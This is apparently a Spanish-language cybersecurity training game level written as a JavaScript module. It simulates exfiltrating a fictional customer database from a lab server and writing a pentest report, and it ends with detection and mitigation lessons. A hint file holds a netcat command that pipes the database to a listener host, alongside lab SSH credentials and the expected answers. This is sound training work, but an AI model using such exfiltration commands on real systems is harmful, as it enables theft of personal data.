// ============================================================
// RT-06 — La joya de la corona: exfiltración y informe al CISO
// Acceso al servidor de archivos, exfiltrar la base y reportar.
// ============================================================

export default {
  id: "rt-06-exfil",
  modo: "rt",
  titulo: "La joya de la corona: exfiltración y entrega del informe",
  nivel: 4,
  severidad: "CRÍTICA",
  sla: 1800,
  xp: 480,
  briefing:
    "Última fase del engagement. Las credenciales del administrador te dan acceso al servidor de archivos (10.10.10.70). Encuentra la base de datos de clientes (/data/crown.db), exfiltra una copia a tu máquina y entrega el INFORME DE PENTEST definitivo al CISO: resumen ejecutivo, hallazgos, datos obtenidos, impacto y recomendaciones. Es tu examen para llegar a CISO.",
  red: {
    hosts: {
      "10.10.10.70": {
        hostname: "files.cibercorp.local",
        os: "Linux Ubuntu 22.04",
        puertos: "22/tcp  open  ssh  OpenSSH 8.9p1\n443/tcp open  https nginx 1.24.0",
      },
      "10.10.10.100": {
        hostname: "pentest-ops.cibercorp.local (tu maquina)",
        os: "Kali Linux 2024",
        puertos: "4444/tcp open  netcat listener (exfil)",
      },
    },
  },
  credenciales: [
    {
      servicio: "ssh",
      host: "10.10.10.70",
      usuario: "admin",
      password: "Passw0rd!2024",
      nota: "Credencial del dominio reutilizada (hallazgo del caso anterior).",
    },
  ],
  fs: {
    "/data/": ["crown.db", "METADATA.txt"],
    "/data/crown.db": [
      "=== CROWN JEWELS: BASE DE CLIENTES Y FINANZAS ===",
      "registros: 42.000 clientes",
      "campos: nombre, DNI, email, direccion, IBAN, historial crediticio",
      "tamano: 2.4 GB (comprimida 380 MB)",
      "clasificacion: CONFIDENCIAL - RGPD Art. 32",
      "ultimo respaldo: ayer (sin cifrar)",
    ].join("\n"),
    "/data/METADATA.txt": "Exportada desde el ERP. Enviar solo por canal cifrado.",
    "/home/pentester/": ["notas.txt"],
    "/home/pentester/notas.txt": [
      "PENDIENTE: exfiltrar /data/crown.db a 10.10.10.100:4444",
      "netcat: nc 10.10.10.100 4444 < /data/crown.db",
      "despues: escribir el informe final con 'informe'",
    ].join("\n"),
  },
  correctas: {
    recon: ["host:10.10.10.70"],
    acceso: ["host:10.10.10.70"],
    escalada: [],
    exfiltracion: ["archivo:/data/crown.db"],
  },
  incorrectas: [],
  pistas: [
    "Entra: `ssh admin@10.10.10.70` (Passw0rd!2024, hallazgo del caso anterior).",
    "Explora /data y exfiltra la base: `exfiltrar /data/crown.db`.",
    "El informe se evalúa por cobertura de hallazgos: hosts, vulnerabilidades, datos obtenidos y recomendaciones.",
  ],
  eventos: [
    { en: 600, tipo: "alerta", sev: "HIGH", titulo: "DLP: transferencia saliente de gran volumen desde files.cibercorp.local" },
  ],
  leccion: {
    titulo: "Del acceso a la entrega: exfiltración y reporte profesional",
    resumen:
      "Un pentest no termina con los datos: termina con un informe que un directivo entienda. La exfiltración (real o simulada) demuestra el impacto real: 42.000 clientes con DNI e IBAN accesibles con una password reutilizada. El informe ejecutivo convierte el caos técnico en riesgo de negocio.",
    deteccion:
      "- Transferencias salientes de gran volumen (DLP/NDR).\n- Accesos SSH desde IPs no habituales a servidores de datos.\n- Copias de bases sin cifrar y sin auditoría.\n- Passwords reutilizadas entre dominios y servicios.",
    respuesta:
      "1. Cifrar datos en reposo y en tránsito.\n2. Segmentación estricta + MFA en servidores de datos.\n3. Monitorización DLP de exfiltración.\n4. Gestor de contraseñas corporativo (nada de reutilizar).\n5. Plan de respuesta para fugas de datos personales.",
    aprendizaje: [
      "El impacto se mide en datos, no en exploits.",
      "Un buen informe ejecutivo convierte vulnerabilidades en decisiones.",
      "La reutilización de credenciales es el hilo que une toda la campaña.",
    ],
    glosario: ["DLP", "RGPD", "Informe ejecutivo", "Crown jewels"],
    mitre: ["T1041", "T1020", "T1078"],
  },
};
